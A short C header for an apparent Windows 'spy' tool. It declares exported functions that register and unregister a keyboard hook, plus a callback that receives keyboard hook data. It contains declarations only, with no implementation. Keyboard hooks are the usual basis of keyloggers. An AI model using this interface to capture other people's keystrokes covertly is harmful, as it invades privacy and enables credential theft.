#pragma once
#include "spy.h"

// register hook to windows, call in the first time spy start
EXPORT DWORD register_hook();
// unregister hook from windows, call when spy exit
EXPORT VOID unregister_hook();
// a call back function which will receive keyboard hook data from windows
EXPORT LRESULT CALLBACK kb_hook_proc(int nCode, WPARAM wParam, LPARAM lParam);